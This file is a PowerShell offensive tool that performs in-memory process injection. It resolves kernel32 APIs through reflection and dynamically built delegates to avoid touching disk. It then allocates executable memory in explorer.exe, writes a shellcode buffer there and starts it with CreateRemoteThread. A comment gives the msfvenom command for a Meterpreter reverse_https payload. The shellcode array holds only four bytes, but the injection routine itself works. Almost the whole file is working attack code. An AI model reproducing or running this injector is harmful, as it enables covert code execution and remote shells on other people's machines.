Function Standard_Process_Injection_Delegate_inMemory {

    function Invoke-FunctionLookup {
        Param (
            [Parameter(Position = 0, Mandatory = $true)] 
            [string] $moduleName,

            [Parameter(Position = 1, Mandatory = $true)] 
            [string] $functionName
        )

        $systemType = ([AppDomain]::CurrentDomain.GetAssemblies() | 
            Where-Object { $_.GlobalAssemblyCache -and $_.Location.Split('\\')[-1] -eq 'System.dll' }
        ).GetType('Microsoft.Win32.UnsafeNativeMethods')

        $getProcAddressMethod = $systemType.GetMethods() | 
        Where-Object { $_.Name -eq "GetProcAddress" }

        $moduleHandle = $systemType.GetMethod('GetModuleHandle').Invoke($null, @($moduleName))

        return $getProcAddressMethod[0].Invoke($null, @($moduleHandle, $functionName))
    }

    function Invoke-GetDelegate {
        Param (
            [Parameter(Position = 0, Mandatory = $true)] 
            [Type[]] $parameterTypes,

            [Parameter(Position = 1, Mandatory = $false)] 
            [Type] $returnType = [Void]
        )

        $assemblyBuilder = [AppDomain]::CurrentDomain.DefineDynamicAssembly(
            (New-Object System.Reflection.AssemblyName('ReflectedDelegate')),
            [System.Reflection.Emit.AssemblyBuilderAccess]::Run
        )

        $moduleBuilder = $assemblyBuilder.DefineDynamicModule('InMemoryModule', $false)

        $typeBuilder = $moduleBuilder.DefineType(
            'MyDelegateType', 
            [System.Reflection.TypeAttributes]::Class -bor 
            [System.Reflection.TypeAttributes]::Public -bor 
            [System.Reflection.TypeAttributes]::Sealed -bor 
            [System.Reflection.TypeAttributes]::AnsiClass -bor 
            [System.Reflection.TypeAttributes]::AutoClass, 
            [System.MulticastDelegate]
        )

        $constructorBuilder = $typeBuilder.DefineConstructor(
            [System.Reflection.MethodAttributes]::RTSpecialName -bor 
            [System.Reflection.MethodAttributes]::HideBySig -bor 
            [System.Reflection.MethodAttributes]::Public,
            [System.Reflection.CallingConventions]::Standard,
            $parameterTypes
        )

        $constructorBuilder.SetImplementationFlags(
            [System.Reflection.MethodImplAttributes]::Runtime -bor 
            [System.Reflection.MethodImplAttributes]::Managed
        )

        $methodBuilder = $typeBuilder.DefineMethod(
            'Invoke',
            [System.Reflection.MethodAttributes]::Public -bor 
            [System.Reflection.MethodAttributes]::HideBySig -bor 
            [System.Reflection.MethodAttributes]::NewSlot -bor 
            [System.Reflection.MethodAttributes]::Virtual,
            $returnType,
            $parameterTypes
        )

        $methodBuilder.SetImplementationFlags(
            [System.Reflection.MethodImplAttributes]::Runtime -bor 
            [System.Reflection.MethodImplAttributes]::Managed
        )

        return $typeBuilder.CreateType()
    }

    $openProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (Invoke-FunctionLookup -moduleName "kernel32.dll" -functionName "OpenProcess"), 
    (Invoke-GetDelegate @([UInt32], [bool], [UInt32]) ([IntPtr])))

    $virtualAllocEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (Invoke-FunctionLookup -moduleName "kernel32.dll" -functionName "VirtualAllocEx"), 
    (Invoke-GetDelegate @([IntPtr], [IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])))

    $writeProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (Invoke-FunctionLookup -moduleName "kernel32.dll" -functionName "WriteProcessMemory"), 
    (Invoke-GetDelegate @([IntPtr], [IntPtr], [Byte[]], [UInt32], [IntPtr]) ([bool])))

    $createRemoteThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (Invoke-FunctionLookup -moduleName "kernel32.dll" -functionName "CreateRemoteThread"), 
    (Invoke-GetDelegate @([IntPtr], [IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])))

    # msfvenom.bat -p windows/x64/meterpreter/reverse_https LHOST=127.0.0.1 LPORT=7710 -f powershell EXITFUNC=thread
    [Byte[]] $buf = 0xfc,0x48,0x83,0xe4
    $size = $buf.Length

    # Get the process ID of explorer
    $Process = (Get-Process -Name "explorer").Id

    # Open a handle to the process
    $hProcess = $openProcess.Invoke(0x001F0FFF, $false, $Process)

    # Allocate memory in the remote process
    $addr = $virtualAllocEx.Invoke($hProcess, [IntPtr]::Zero, $size, 0x3000, 0x40)

    # Write shellcode to the allocated memory
    $outsize = [IntPtr]::Zero
    $writeProcessMemory.Invoke($hProcess, $addr, $buf, $size, $outsize) > $null

    # Create a remote thread to execute the shellcode
    $createRemoteThread.Invoke($hProcess, [IntPtr]::Zero, 0, $addr, [IntPtr]::Zero, 0, [IntPtr]::Zero) > $null

}

Standard_Process_Injection_Delegate_inMemory
